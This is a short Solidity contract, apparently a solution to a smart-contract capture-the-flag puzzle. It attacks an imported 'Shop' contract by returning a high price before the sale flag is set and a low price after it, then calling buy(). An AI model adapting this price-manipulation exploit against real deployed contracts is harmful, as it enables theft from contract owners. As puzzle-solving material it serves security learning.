// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Shop.sol";

contract Solution {
    Shop shop;

    constructor(address _shop) {
        shop = Shop(_shop);
    }

    function price() public view returns (uint256) {
        if (shop.isSold() == false) {
            return 100;
        } else {
            return 1;
        }
    }

    function buy() public {
        shop.buy();
    }
}
